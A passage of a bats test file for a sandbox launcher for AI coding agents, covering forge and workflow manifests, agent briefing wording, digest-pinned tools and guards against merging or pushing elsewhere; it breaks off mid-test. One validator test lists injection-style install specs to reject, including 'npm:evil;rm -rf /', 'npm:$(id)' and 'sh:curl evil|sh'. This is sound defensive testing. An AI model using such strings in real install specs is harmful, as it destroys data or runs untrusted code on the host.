@test "no doc still points at the old gitea CLI paths" {
    run grep -rn 'bin/gitea-pr\|bin/gitea-issue' "$REPO_ROOT/README.md" \
        "$REPO_ROOT/docs" "$REPO_ROOT/install.sh"
    [ "$status" -ne 0 ] || { echo "$output"; return 1; }
}

@test "the briefing names a real forge host, and says nothing about one for none" {
    printf '[forge.gitea]\nssh_host = git.example\n' > "$CONFIG_DIR/config"
    run lib briefing_compose gitea worktree-pr claude-code
    [ "$status" -eq 0 ] || { echo "$output"; return 1; }
    [[ "$output" == *"GitHub read-only, the configured gitea host (git.example), plus anything"* ]]

    # workflows/local-only (Task 4) is what `forge = none` is meant to pair
    # with - none's capabilities are empty, and local-only requires none, so
    # this composes the real shipped trio rather than a throwaway workflow.
    run lib briefing_compose none local-only claude-code
    [ "$status" -eq 0 ] || { echo "$output"; return 1; }
    # No dangling article, no "none" read as a forge name.
    [[ "$output" == *"GitHub read-only, plus anything"* ]]
    [[ "$output" != *"configured none host"* ]]
}

@test "branch-push pushes and blocks main, but attempts no PR" {
    run lib manifest_validate workflow branch-push
    [ "$status" -eq 0 ] || { echo "$output"; return 1; }
    [ "$(lib manifest_get workflow branch-push push)" = "on" ]
    [ "$(lib manifest_get workflow branch-push blocked_branches)" = "main master" ]
    [ "$(lib manifest_get workflow branch-push block_merge)" = "on" ]
    [ "$(lib manifest_get workflow branch-push requires_worktree)" = "on" ]
    [ "$(lib manifest_get workflow branch-push autonomy)" = "push-branch" ]
    # Requires no capability, so it is usable against a forge that offers
    # none - but it still pushes, so unlike a non-pushing workflow it cannot
    # pair with forge = none itself (rule 3: a pushing workflow needs a forge
    # that resolves to a host, and none never does). Exercised here against
    # gitea, fully configured, for a host without exercising any capability.
    printf '[forge.gitea]\nssh_host = git.example\napi = https://api.example/v1\ntoken_file = /dev/null\n' \
        > "$CONFIG_DIR/config"
    run lib provider_validate_selection gitea branch-push claude-code
    [ "$status" -eq 0 ] || { echo "$output"; return 1; }
}

@test "the branch-push briefing tells the agent to stop at the push" {
    run lib briefing_compose gitea branch-push claude-code
    [ "$status" -eq 0 ] || { echo "$output"; return 1; }
    [[ "$output" == *"Push that branch"* ]]
    # It must not instruct opening a PR - that is worktree-pr's job, and this
    # workflow's whole point is that it stops earlier.
    [[ "$output" != *"create"*"PR"* ]] || { echo "branch-push briefing mentions opening a PR"; return 1; }
}

# #32: an implementer ran a bare `git config user.name ...` inside a
# worktree and wrote the parent checkout's real config, misattributing three
# commits. A worktree isolates the working tree, not `.git/config`, and the
# briefing told the agent to use worktrees while saying nothing about that -
# which reads as more isolation than is on offer. The same unscoped command
# reaches core.hooksPath and credential.helper, which execute on the host.
#
# In the core paragraph rather than a workflow's own prose, so a workflow can
# opt into worktrees but cannot ship them without this.
@test "every worktree briefing says a worktree does not isolate .git/config" {
    local wf
    for wf in worktree-pr branch-push; do
        [ "$(lib manifest_get workflow "$wf" requires_worktree)" = "on" ]
        run lib briefing_compose gitea "$wf" claude-code
        [ "$status" -eq 0 ] || { echo "$output"; return 1; }
        [[ "$output" == *".git/config"* ]] \
            || { echo "$wf briefing does not mention .git/config"; return 1; }
        [[ "$output" == *"git -C"* ]] \
            || { echo "$wf briefing does not give the scoped form"; return 1; }
    done
}

# The negative half: a workflow that does not use worktrees has no reason to
# carry the paragraph, and its presence there would mean the splice is
# unconditional rather than opt-in.
@test "a workflow without worktrees does not carry the worktree paragraph" {
    [ "$(lib manifest_get workflow local-only requires_worktree)" = "off" ]
    run lib briefing_compose none local-only claude-code
    [ "$status" -eq 0 ] || { echo "$output"; return 1; }
    [[ "$output" != *"does not isolate"* ]]
    [[ "$output" != *"worktree MUST live"* ]]
}

# The default that blocks GitHub push exists to stop an eager agent pushing to
# somebody else's project. When the operator lifts it, the agent gains the
# ability without the reason, so the briefing supplies the reason.
@test "the briefing warns against pushing elsewhere when GitHub push is on" {
    DEJIMA_GITHUB_PUSH=on run lib briefing_compose gitea worktree-pr claude-code
    [ "$status" -eq 0 ] || { echo "$output"; return 1; }
    [[ "$output" == *"GitHub push is enabled for this session"* ]]
    [[ "$output" == *"pointed at and nothing else"* ]]
    [[ "$output" == *"not a contribution"* ]]
    # and it says what to do instead of nothing at all
    [[ "$output" == *"say so in your reply"* ]]
}

@test "a project that declares corpus gets the commit-granularity rule" {
    DEJIMA_CORPUS=on run lib briefing_compose gitea worktree-pr claude-code
    [ "$status" -eq 0 ] || { echo "$output"; return 1; }
    # Matched against the text with its line breaks flattened. The briefing is
    # wrapped prose, so any assertion on more than a couple of words is
    # otherwise hostage to where a line happens to end - which is how the
    # first version of this test failed on text that was present.
    local flat
    flat="$(printf '%s' "$output" | tr '\n' ' ' | tr -s ' ')"
    [[ "$flat" == *"its own commit"* ]] || { echo "no per-step commit rule"; return 1; }
    # The reason travels with the rule. A convention with no reason attached is
    # one an agent talks itself out of the first time it is inconvenient.
    [[ "$flat" == *"state before it and after it can both be read back"* ]] \
        || { echo "the rule is stated without its reason"; return 1; }
    [[ "$flat" == *"inventing a file state the repository never held"* ]] \
        || { echo "does not say why splitting the diff is not an option"; return 1; }
    # And the two edges that stop it becoming ceremony.
    [[ "$flat" == *"needs no commit"* ]] \
        || { echo "does not exempt steps that only read"; return 1; }
    [[ "$flat" == *"squash"* ]] \
        || { echo "says nothing about squashing the step commits away"; return 1; }
    # And names the act that actually destroys the record. A squash-merge with
    # the branch retained leaves the step commits reachable, because a clone
    # fetches remote branches; deleting the branch removes the last pointer to
    # them. Naming only squashing would let a project follow every rule and
    # still yield nothing, under a forge default it never chose.
    [[ "$flat" == *"DELETED"* ]] \
        || { echo "does not name branch deletion as the destructive act"; return 1; }
}

@test "a project declaring no corpus gets no commit-granularity rule" {
    # Off by default, and the default is the absence of a file rather than a
    # setting - so this is what every project that has not asked for it sees.
    run lib briefing_compose gitea worktree-pr claude-code
    [ "$status" -eq 0 ] || { echo "$output"; return 1; }
    [[ "$output" != *"own commit"* ]] \
        || { echo "the corpus rule leaked into an undeclared project"; return 1; }
}

@test "the corpus rule says nothing about who collects it or why" {
    # dejima ships the rule, not the argument for it. A briefing that made the
    # case would be dejima lobbying for a use the project already opted into,
    # in every session, for every user of that project.
    DEJIMA_CORPUS=on run lib briefing_compose gitea worktree-pr claude-code
    local forbidden
    for forbidden in benchmark corpus-building training "machine learning" dataset; do
        [[ "${output,,}" != *"${forbidden,,}"* ]] \
            || { echo "the briefing argues for the use: $forbidden"; return 1; }
    done
}

# Two points from docs/responsible-use.md that an agent can act on, as
# opposed to the majority which are the operator's to follow. Kept short on
# purpose: this text is in every session's context, for every user.
@test "the briefing names the two responsible-use points an agent can act on" {
    run lib briefing_compose gitea worktree-pr claude-code
    [ "$status" -eq 0 ] || { echo "$output"; return 1; }
    # a domain that acts on the world rather than serving data
    [[ "$output" == *"action rather than a source"* ]]
    [[ "$output" == *"let the operator decide"* ]]
    # and things in the working tree that are not code
    [[ "$output" == *"not"*"code"* ]]
    [[ "$output" == *".env"* ]]
}

@test "the briefing says nothing about GitHub push when it is off" {
    run lib briefing_compose gitea worktree-pr claude-code
    [ "$status" -eq 0 ] || { echo "$output"; return 1; }
    [[ "$output" != *"GitHub push is enabled"* ]]
}

@test "bin/dejima turns the GitHub push briefing on for both routes to it" {
    # --allow-github-push, and forge = github under a pushing workflow.
    grep -q 'DEJIMA_GITHUB_PUSH=on' "$REPO_ROOT/bin/dejima"
    grep -q 'ALLOW_GITHUB_PUSH_FLAG" = 1 \]; then' "$REPO_ROOT/bin/dejima"
    grep -q 'hosts_allowlisted_by_core" ) \?= "on"\|hosts_allowlisted_by_core)" = "on"' "$REPO_ROOT/bin/dejima"
    grep -q 'export DEJIMA_GITHUB_PUSH' "$REPO_ROOT/bin/dejima"
}

@test "no shipped workflow tells the agent not to merge without blocking it" {
    # Every shipped briefing says some version of "do not merge". Two of them
    # said it with block_merge off, which made the sentence an assertion
    # nothing held: the forge's CLI is installed by the FORGE, so `<pr> merge`
    # is on PATH whenever a forge is selected, whatever the workflow tells the
    # agent to do. The manifest that was off carried a reason - "nothing here
    # ever reaches a forge's PR interface" - and the reason was false.
    #
    # Asserted as an invariant over every workflow rather than as three pinned
    # values, because a fourth workflow gets this wrong the same way. A
    # workflow that genuinely means to permit merging has to say so in its
    # briefing and change this test on purpose.
    local wf name
    for wf in "$REPO_ROOT"/workflows/*/; do
        [ -d "$wf" ] || continue
        name="$(basename "$wf")"
        [ "$(lib manifest_get workflow "$name" block_merge)" = "on" ] \
            || { echo "$name leaves merging unguarded"; return 1; }
        grep -qi 'merg' "$wf/briefing.md" \
            || { echo "$name's briefing says nothing about merging"; return 1; }
    done
}

@test "a workflow blocking merges reaches the guard with the forge's command" {
    # block_merge is only half of it: what actually refuses the command is
    # DEJIMA_MERGE_BLOCK, resolved from the FORGE's merge_block and passed to
    # docker/forge-guard.sh. A workflow with the flag on and a forge that
    # names no command blocks nothing, which is correct - there is nothing to
    # block - but the pairing is what has to hold.
    local wf
    for wf in branch-push local-only worktree-pr; do
        [ "$(lib manifest_get workflow "$wf" block_merge)" = "on" ] || continue
        [ -n "$(lib manifest_get forge gitea merge_block)" ] \
            || { echo "gitea names no merge command for $wf to block"; return 1; }
    done
    grep -q 'DEJIMA_MERGE_BLOCK="$(manifest_get forge "$DEJIMA_FORGE_NAME" merge_block)"' \
        "$REPO_ROOT/bin/dejima" \
        || { echo "the launcher no longer resolves the forge's merge command"; return 1; }
}

@test "local-only pushes nothing and blocks no branches" {
    run lib manifest_validate workflow local-only
    [ "$status" -eq 0 ] || { echo "$output"; return 1; }
    [ "$(lib manifest_get workflow local-only push)" = "off" ]
    [ "$(lib manifest_get workflow local-only block_merge)" = "on" ]
    [ "$(lib manifest_get workflow local-only requires_worktree)" = "off" ]
    [ "$(lib manifest_get workflow local-only autonomy)" = "commit" ]
    # blocked_branches is empty BECAUSE push is off - there is no push to
    # block. This pins the pair together: turning push on later without
    # revisiting this would silently allow a push to main.
    [ -z "$(lib manifest_get workflow local-only blocked_branches)" ]
}

@test "none + local-only is a valid, fully unconfigured selection" {
    run lib provider_validate_selection none local-only claude-code
    [ "$status" -eq 0 ] || { echo "$output"; return 1; }
    [ -z "$output" ]
}

# --- optional tools ----------------------------------------------------------

@test "every shipped tool is pinned by digest, not fetched from a moving ref" {
    # The bar docs/tools.md sets, asserted rather than described. A tool that
    # installs from whatever a branch points at today is one nothing has
    # reviewed, and it would build differently on different days with no
    # change to this repository.
    local tool spec
    for tool in $(lib provider_list tool); do
        run lib manifest_validate tool "$tool"
        [ "$status" -eq 0 ] || { echo "$output"; return 1; }
        spec="$(lib manifest_get tool "$tool" install)"
        [[ "$spec" == tarball:* ]] \
            || { echo "$tool does not install from a pinned artifact: $spec"; return 1; }
        # valid_tarball_spec already requires a 64-hex digest and an https
        # URL; this is the part it cannot check - that the URL names a
        # version rather than a branch.
        [[ "$spec" != *"/refs/heads/"* && "$spec" != *"/master/"* && "$spec" != *"/main/"* ]] \
            || { echo "$tool installs from a moving ref: $spec"; return 1; }
    done
}

@test "a tool cannot declare anything that changes what dejima permits" {
    # The manifest has no key for a hook, a mount, a domain or a guard. A tool
    # that needed one would be a change to the boundary rather than a program
    # on PATH, and adding the key is the moment to argue about it - not the
    # moment a manifest quietly starts carrying one.
    local key
    for key in guards hooks mounts api_domains fixed_hosts install_hook \
               briefing no_confirm_args settings_args; do
        run lib manifest_get tool rtk "$key"
        [ "$status" -ne 0 ] \
            || { echo "the tool schema accepts '$key', which it must not"; return 1; }
    done
}

@test "rtk declares the archive shape its release actually has" {
    # Inspected: `tar tzf rtk-x86_64-unknown-linux-musl.tar.gz` lists one
    # entry, `rtk`, with no enclosing directory. Declared `prefix`, the layer
    # would strip that single component, extract nothing, and build cleanly -
    # a tool the session is told it has and does not.
    #
    # Pinned here because the emitter test below exercises both shapes with an
    # explicit setting and so cannot notice this manifest changing.
    [ "$(lib manifest_get tool rtk install_layout)" = "binary" ] \
        || { echo "rtk's release is a bare binary and the manifest no longer says so"; return 1; }
}

@test "a tool may only set environment variables that are its own" {
    # image_env becomes a Dockerfile ENV, which every process in the container
    # inherits - not just the tool that declared it. rtk shipped with
    # NO_COLOR=1, reasoning that its output lands in a model's context where an
    # escape sequence is noise. The reasoning was fine and the scope was wrong:
    # a launch with the tool enabled lost colour in the harness, in git, in ls,
    # in everything.
    #
    # A harness may set a bare name there, because a harness IS the container's
    # main process. A tool is one program among many.
    local d; d="$(mktemp -d "$BATS_TEST_TMPDIR/toolenv.XXXXXX")"
    mkdir -p "$d/tools/probe"
    local sha; sha="$(printf 'a%.0s' {1..64})"
    local bad
    for bad in 'NO_COLOR=1' 'DO_NOT_TRACK=1' 'PATH=/x' 'PROBEISH_X=1'; do
        printf 'description = x\ninstall = tarball:p@%s:https://e.example/p.tgz\ncommand = p\nimage_env = %s\n' \
            "$sha" "$bad" > "$d/tools/probe/tool.conf"
        run env DEJIMA_PROVIDER_ROOT="$d" \
            bash -c 'source "$1"; tool_validate probe' _ "$LIB"
        [ "$status" -ne 0 ] || { echo "accepted image_env $bad"; return 1; }
        [[ "$output" == *"not its own"* ]] || { echo "$output"; return 1; }
    done

    # Namespaced to the tool, which is what a tool's own switch looks like.
    printf 'description = x\ninstall = tarball:p@%s:https://e.example/p.tgz\ncommand = p\nimage_env = PROBE_TELEMETRY=0 PROBE_QUIET=1\n' \
        "$sha" > "$d/tools/probe/tool.conf"
    run env DEJIMA_PROVIDER_ROOT="$d" bash -c 'source "$1"; tool_validate probe' _ "$LIB"
    [ "$status" -eq 0 ] || { echo "$output"; return 1; }
}

@test "no shipped tool takes the colour out of the rest of the container" {
    # The specific regression, pinned by name as well as by the rule above:
    # these are the bare names most likely to look like a tool's own business
    # and reach everything.
    local tool pair
    for tool in $(lib provider_list tool); do
        run lib tool_validate "$tool"
        [ "$status" -eq 0 ] || { echo "$output"; return 1; }
        for pair in $(lib manifest_get tool "$tool" image_env); do
            case "${pair%%=*}" in
                NO_COLOR|TERM|CLICOLOR|CLICOLOR_FORCE|FORCE_COLOR)
                    echo "$tool sets ${pair%%=*} for the whole container"; return 1 ;;
            esac
        done
    done
}

@test "rtk is declared with its telemetry switched off in the image" {
    # Two independent offs, because either one can be wrong: the tool's own
    # switch here, and the firewall, which does not allowlist the endpoint.
    [[ "$(lib manifest_get tool rtk image_env)" == *"RTK_TELEMETRY_DISABLED=1"* ]] \
        || { echo "rtk's telemetry switch is no longer set"; return 1; }
    # And the endpoint stays out of what core allowlists.
    run grep -rn 'telemetry.rtk-ai' "$REPO_ROOT/docker" "$REPO_ROOT/bin"
    [ "$status" -ne 0 ] || { echo "the telemetry endpoint reached the allowlist:"; echo "$output"; return 1; }
}

@test "a tool's archive shape decides how it is unpacked" {
    # A bare-binary archive stripped of a component extracts NOTHING, and does
    # it silently: the layer builds, and the tool is not in it.
    local spec
    spec="tarball:x@$(printf 'a%.0s' {1..64}):https://e.example/x.tgz"
    run env DEJIMA_TARBALL_STRIP=binary bash -c \
        'source "$1"; generate_spec_dockerfile base "$2"' _ "$LIB_PROJECT" "$spec"
    [[ "$output" == *"tar -C /opt/dejima/x/bin -xaf"* ]] \
        || { echo "binary layout still strips a component: $output"; return 1; }
    run env DEJIMA_TARBALL_STRIP=prefix bash -c \
        'source "$1"; generate_spec_dockerfile base "$2"' _ "$LIB_PROJECT" "$spec"
    [[ "$output" == *"--strip-components=1"* ]] \
        || { echo "prefix layout stopped stripping: $output"; return 1; }
    # Both verify before they unpack. A tar extracted first and checked after
    # has already written whatever it contained.
    [[ "$output" == *"sha256sum -c -"*"tar -C"* ]] \
        || { echo "the digest is no longer checked before unpacking"; return 1; }
}

@test "the briefing names the tools a launch enabled, and says nothing when there are none" {
    run env DEJIMA_TOOLS=rtk bash -c \
        'source "$1"; briefing_compose none local-only claude-code' _ "$LIB"
    [ "$status" -eq 0 ] || { echo "$output"; return 1; }
    [[ "$output" == *"Extra tools this session has"* ]] || { echo "$output"; return 1; }
    [[ "$output" == *"rtk git status"* ]] \
        || { echo "the tool's own instructions did not reach the briefing"; return 1; }

    run env DEJIMA_TOOLS= bash -c \
        'source "$1"; briefing_compose none local-only claude-code' _ "$LIB"
    [[ "$output" != *"Extra tools this session has"* ]] \
        || { echo "a heading with nothing under it"; return 1; }
}

@test "the github forge pushes with its own token, not the read-only one" {
    run lib manifest_validate forge github
    [ "$status" -eq 0 ] || { echo "$output"; return 1; }
    [ "$(lib manifest_get forge github capabilities)" = "pr issues" ]
    [ "$(lib manifest_get forge github pr_command)" = "gh pr" ]
    [ "$(lib manifest_get forge github merge_block)" = "gh pr merge" ]
    # The write-capable token is its own key. Reusing [github] token_file
    # would promote a deliberately read-only PAT to a pushing credential.
    [ "$(lib manifest_get forge github requires)" = "push_token_file" ]
    [[ "$(lib manifest_get forge github env_export)" == *"GH_TOKEN=@push_token_file"* ]]
    # gh comes from a package rather than from this repo, but it is still
    # declared: the entrypoint links the merge shadow only over a command that
    # is behind /usr/local/lib/dejima/forge, and refuses to start otherwise.
    # This forge shipping nothing of its own is what "system:" says.
    # system:gh AND the one CLI this forge ships. install-forge-bins.sh fails
    # the build in both directions - a declared file that is missing, and a
    # file under bin/ that no manifest declares - so this is the declaration
    # an operator reads to know what lands in the image.
    [ "$(lib manifest_get forge github install)" = "system:gh bin/github-pr" ]
}

@test "each forge declares which of its keys belong to a person" {
    # The credential paths, which a project may not declare and an identity
    # may set. One declaration drives both rules, so they cannot disagree
    # about which key is which.
    [ "$(lib manifest_get forge gitea identity_keys)" = "token_file" ]
    [ "$(lib manifest_get forge github identity_keys)" = "push_token_file" ]
    [ -z "$(lib manifest_get forge none identity_keys)" ]
    # And every one of them is a key that forge actually has, or the identity
    # would offer a setting nothing reads.
    local forge key spec found
    for forge in $(lib provider_list forge); do
        for key in $(lib manifest_get forge "$forge" identity_keys); do
            found=0
            for spec in $(lib manifest_get forge "$forge" keys); do
                [ "${spec%%:*}" = "$key" ] && found=1
            done
            [ "$found" -eq 1 ] \
                || { echo "$forge names identity key '$key' and has no such key"; return 1; }
        done
    done
}

@test "no two forges claim the same identity key name" {
    # An identity's keys are unqualified, so one name resolving to two forges'
    # types would make the validation depend on which forge was read first.
    # Refused here rather than guessed at in _identity_key_specs.
    local forge key seen=""
    for forge in $(lib provider_list forge); do
        for key in $(lib manifest_get forge "$forge" identity_keys); do
            case " $seen " in
                *" $key "*) echo "two forges declare identity key '$key'"; return 1 ;;
            esac
            seen="$seen $key"
        done
    done
}

@test "the identity key set is core's two plus whatever the forges declare" {
    # ssh_key and the git name are core's, because every forge needs the same
    # answer to "who is pushing". The credentials are not, and are typed by
    # the forge that owns them rather than by a second copy here.
    local specs
    specs="$(lib _identity_key_specs)"
    grep -qP '^ssh_key\t\?path$' <<< "$specs" || { echo "$specs"; return 1; }
    grep -qP '^user_name\t\?text$' <<< "$specs" || { echo "$specs"; return 1; }
    grep -qP '^user_email\t\?text$' <<< "$specs" || { echo "$specs"; return 1; }
    grep -qP '^token_file\t\?path$' <<< "$specs" \
        || { echo "token_file did not inherit gitea's type: $specs"; return 1; }
}

@test "the github forge declares how its CLI can be aimed at another repo" {
    # gh takes --repo on nearly every subcommand and reads GH_REPO, so the
    # ordinary path can act on a repository the session has nothing to do
    # with (#187). The guard is generic; the manifest is what makes it fire.
    [ "$(lib manifest_get forge github repo_flags)" = "--repo -R" ]
    [ "$(lib manifest_get forge github repo_env)" = "GH_REPO" ]
    # And in a path rather than a flag: `gh api repos/<owner>/<name>/...`
    # names a repository with no --repo in it at all (#243).
    [ "$(lib manifest_get forge github repo_paths)" = "api:repos" ]
    # The gitea CLIs resolve the repo from origin and refuse another host, so
    # there is nothing to declare and nothing for the guard to compare. A
    # forge is not required to be aimable.
    [ -z "$(lib manifest_get forge gitea repo_flags)" ]
    [ -z "$(lib manifest_get forge gitea repo_env)" ]
    [ -z "$(lib manifest_get forge gitea repo_paths)" ]
}

@test "a repo path has to name a subcommand and a segment" {
    # `<subcommand>:<first segment>`. The subcommand half is what keeps the
    # guard from comparing every positional argument that contains two
    # slashes, so a spelling that omits it is not a narrower declaration - it
    # is one that would refuse an issue title.
    local d bad; d="$(mktemp -d "$BATS_TEST_TMPDIR/pathtype.XXXXXX")"
    mkdir -p "$d/forges/probe"
    for bad in "repos" "api:" ":repos" "api:repos/more" "api:/repos" "-api:repos"; do
        printf 'repo_paths = %s\n' "$bad" > "$d/forges/probe/forge.conf"
        run env DEJIMA_PROVIDER_ROOT="$d" \
            bash -c 'source "$1"; manifest_validate forge probe' _ "$LIB"
        [ "$status" -ne 0 ] || { echo "accepted repo_paths = $bad"; return 1; }
    done
    printf 'repo_paths = api:repos\n' > "$d/forges/probe/forge.conf"
    run env DEJIMA_PROVIDER_ROOT="$d" \
        bash -c 'source "$1"; manifest_validate forge probe' _ "$LIB"
    [ "$status" -eq 0 ] || { echo "$output"; return 1; }
}

@test "a repo flag has to look like a flag" {
    # It is compared against argv. A bare word would be indistinguishable from
    # a subcommand or a value, and would refuse commands at random.
    local d bad; d="$(mktemp -d "$BATS_TEST_TMPDIR/flagtype.XXXXXX")"
    mkdir -p "$d/forges/probe"
    for bad in "repo" "--" "-" "--repo=x"; do
        printf 'repo_flags = %s\n' "$bad" > "$d/forges/probe/forge.conf"
        run env DEJIMA_PROVIDER_ROOT="$d" \
            bash -c 'source "$1"; manifest_validate forge probe' _ "$LIB"
        [ "$status" -ne 0 ] || { echo "accepted repo_flags = $bad"; return 1; }
    done
    # Space-separated, like every other manifest list.
    printf 'repo_flags = --repo -R\n' > "$d/forges/probe/forge.conf"
    run env DEJIMA_PROVIDER_ROOT="$d" \
        bash -c 'source "$1"; manifest_validate forge probe' _ "$LIB"
    [ "$status" -eq 0 ] || { echo "$output"; return 1; }
}

@test "the briefing does not call GitHub read-only when the forge can push to it" {
    # The other half of Task 2's network_allowlist resolver, tested here
    # because this is where the github forge starts existing.
    printf '[forge.github]\npush_token_file = /dev/null\n' > "$CONFIG_DIR/config"
    run lib briefing_compose github branch-push claude-code
    [ "$status" -eq 0 ] || { echo "$output"; return 1; }
    [[ "$output" != *"GitHub read-only"* ]]
    [[ "$output" == *"GitHub, which this session can also push to"* ]]
}

@test "the github forge contributes its hosts without any config" {
    hosts="$(lib forge_hosts github)"
    for h in github.com ssh.github.com api.github.com; do
        [[ " $hosts " == *" $h "* ]] || { echo "missing $h in: $hosts"; return 1; }
    done
}

@test "the github forge routes its hosts through core's allowlist, not the extra-domains one" {
    # The manifest half of the launcher behaviour asserted in test/config.bats
    # ("the github forge's hosts never reach the extra-domains allowlist").
    # Those three hosts are public SaaS names already covered by core's
    # GitHub ranges: sending them down the extra-domains path would put them
    # in the port-unrestricted open class AND exempt them from
    # dnsmasq's stop-dns-rebind, and the firewall's startup self-check
    # ("github.com:22 was reachable without ALLOW_GITHUB_PUSH=1") would then
    # refuse to bring the container up at all.
    [ "$(lib manifest_get forge github hosts_allowlisted_by_core)" = "on" ]
    # Still resolved by forge_hosts, which is what keeps rule 3 (a pushing
    # workflow needs a forge with a host) satisfied and what fills
    # DEJIMA_PUSH_HOSTS so git-push-guard.sh permits the push.
    [ -n "$(lib forge_hosts github)" ]
    # Off unless a manifest says otherwise: a self-hosted forge's host is
    # exactly the internal address the extra-domains path exists for.
    [ "$(lib manifest_get forge gitea hosts_allowlisted_by_core)" = "off" ]
    [ "$(lib manifest_get forge none hosts_allowlisted_by_core)" = "off" ]
}

@test "the network-posture sentence follows the manifest, not the forge's name" {
    # Same key, read for the briefing: with a pushing workflow the session
    # really can push to GitHub, and with a non-pushing one it really cannot
    # (bin/dejima only opens the push grant when the workflow pushes), so the
    # sentence has to say two different things for the same forge.
    printf '[forge.github]\npush_token_file = /dev/null\n' > "$CONFIG_DIR/config"
    run lib briefing_compose github local-only claude-code
    [ "$status" -eq 0 ] || { echo "$output"; return 1; }
    [[ "$output" == *"GitHub read-only"* ]]
    [[ "$output" != *"can also push to"* ]]
    # And no dangling "the configured github host" - core allowlists those,
    # there is nothing for an operator to have configured.
    [[ "$output" != *"configured github host"* ]]
}

@test "a required key that is set but empty counts as missing" {
    # install.sh writes every key commented out at its default, so
    # uncommenting one and not filling it in yields `api =` - set, and worth
    # nothing. config_is_set alone called that configured, and the launch
    # went ahead with every gitea call failing inside the container instead.
    printf '[forge.gitea]\nssh_host = git.example\napi =\n' > "$CONFIG_DIR/config"
    run lib provider_validate_selection gitea worktree-pr claude-code
    [ "$status" -ne 0 ]
    [[ "$output" == *"api"* ]]
}

@test "a single required key that is set but empty is refused too" {
    # The same hole in the other rule: github's one `requires` key can never
    # be "partly" configured, so an empty push_token_file would otherwise
    # sail past both this rule and rule 3 (fixed_hosts means it always
    # resolves to a host) and launch with no push credential at all.
    printf '[core]\nforge = github\n[forge.github]\npush_token_file =\n' > "$CONFIG_DIR/config"
    run lib provider_validate_selection github branch-push claude-code
    [ "$status" -ne 0 ]
    [[ "$output" == *"push_token_file"* ]]
}

@test "the no-host refusal offers the forge that needs no host configured" {
    # The remedy has to include the one an operator who wants to push would
    # actually pick - pointing only at `forge = none` + local-only answers
    # the opposite question. Asserted here as the claim (every forge the
    # remedy names is real), not the literal wording - see
    # assert_remedy_forges_exist.
    printf '[core]\nfirewall = on\n' > "$CONFIG_DIR/config"
    run lib provider_validate_selection gitea worktree-pr claude-code
    [ "$status" -ne 0 ]
    assert_remedy_forges_exist "$output"
    run lib provider_validate_selection none branch-push claude-code
    [ "$status" -ne 0 ]
    assert_remedy_forges_exist "$output"
}

@test "an unset push_token_file yields no GH_TOKEN pair at all, not an empty one" {
    # docker-compose.yml declares GH_TOKEN itself, carrying the independent
    # read-only [github] token_file value. `-e GH_TOKEN=` (the pair
    # forge_env_exports used to emit for an unresolved value) overrides that
    # entry to empty on `docker compose run` - wholly unconfigured must stay
    # silent here, exactly like it already does for provider_validate_selection's
    # own partial-config warning, or selecting this forge with no push token
    # yet silently voids the baseline read-only access every session gets.
    printf '[core]\nforge = github\n' > "$CONFIG_DIR/config"
    run lib forge_env_exports github
    [ "$status" -eq 0 ] || { echo "$output"; return 1; }
    [ -z "$output" ]
}

@test "a configured push_token_file still yields a real GH_TOKEN pair" {
    tok="$CONFIG_DIR/push-token"
    printf 'ghp_example\n' > "$tok"
    printf '[forge.github]\npush_token_file = %s\n' "$tok" > "$CONFIG_DIR/config"
    run lib forge_env_exports github
    [ "$status" -eq 0 ] || { echo "$output"; return 1; }
    [ "$output" = "GH_TOKEN=ghp_example" ]
}

@test "open-pr autonomy is refused against a forge with no pr capability" {
    FAKE_ROOT="$(mktemp -d)"
    mkdir -p "$FAKE_ROOT/forges/nopr" "$FAKE_ROOT/workflows/wants-pr" "$FAKE_ROOT/harnesses/h"
    printf 'capabilities =\n' > "$FAKE_ROOT/forges/nopr/forge.conf"
    # requires is empty, so rule 1 passes and only the autonomy rule can catch this.
    printf 'requires =\npush = on\nautonomy = open-pr\n' > "$FAKE_ROOT/workflows/wants-pr/workflow.conf"
    printf 'command = claude\n' > "$FAKE_ROOT/harnesses/h/harness.conf"
    run env DEJIMA_PROVIDER_ROOT="$FAKE_ROOT" \
        bash -c 'source "$1"; provider_validate_selection nopr wants-pr h' _ "$LIB"
    [ "$status" -ne 0 ]
    [[ "$output" == *"open-pr"* ]]
}

@test "push-branch autonomy is refused when the workflow does not push" {
    FAKE_ROOT="$(mktemp -d)"
    mkdir -p "$FAKE_ROOT/forges/f" "$FAKE_ROOT/workflows/contradiction" "$FAKE_ROOT/harnesses/h"
    printf 'capabilities =\n' > "$FAKE_ROOT/forges/f/forge.conf"
    printf 'requires =\npush = off\nautonomy = push-branch\n' > "$FAKE_ROOT/workflows/contradiction/workflow.conf"
    printf 'command = claude\n' > "$FAKE_ROOT/harnesses/h/harness.conf"
    run env DEJIMA_PROVIDER_ROOT="$FAKE_ROOT" \
        bash -c 'source "$1"; provider_validate_selection f contradiction h' _ "$LIB"
    [ "$status" -ne 0 ]
    [[ "$output" == *"push-branch"* ]]
}

@test "every shipped workflow's autonomy is supported by a forge that ships" {
    # worktree-pr/open-pr and branch-push both push, so both now need a real
    # host (rule 3) - gitea, fully configured. local-only never pushes, so
    # none (nothing configured at all) stays the honest pairing for it.
    printf '[forge.gitea]\nssh_host = git.example\napi = https://api.example/v1\ntoken_file = /dev/null\n' \
        > "$CONFIG_DIR/config"
    run lib provider_validate_selection gitea worktree-pr claude-code
    [ "$status" -eq 0 ] || { echo "gitea+worktree-pr: $output"; return 1; }
    run lib provider_validate_selection gitea branch-push claude-code
    [ "$status" -eq 0 ] || { echo "gitea+branch-push: $output"; return 1; }
    printf '[core]\nfirewall = on\n' > "$CONFIG_DIR/config"
    run lib provider_validate_selection none local-only claude-code
    [ "$status" -eq 0 ] || { echo "none+local-only: $output"; return 1; }
}

# The base image carries no harness, so `install` is what puts the selected one
# there. It reaches a Dockerfile RUN line built on the host, which is why it is
# a dependency spec rather than free text.
@test "a harness install spec is validated as a dependency spec" {
    FAKE_ROOT="$(mktemp -d)"
    mkdir -p "$FAKE_ROOT/harnesses/h"
    local bad
    for bad in 'npm:evil;rm -rf /' 'npm:$(id)' 'sh:curl evil|sh' 'npm:a b' \
               'tarball:x@notasha:https://e.example/x.tar' 'npm:'; do
        printf 'command = h\ninstall = %s\n' "$bad" > "$FAKE_ROOT/harnesses/h/harness.conf"
        run env DEJIMA_PROVIDER_ROOT="$FAKE_ROOT" \
            bash -c 'source "$1"; manifest_validate harness h' _ "$LIB"
        [ "$status" -ne 0 ] || { echo "accepted install spec: $bad"; return 1; }
    done
}

@test "a harness install spec that is a real dependency spec is accepted" {
    FAKE_ROOT="$(mktemp -d)"
    mkdir -p "$FAKE_ROOT/harnesses/h"
    local good
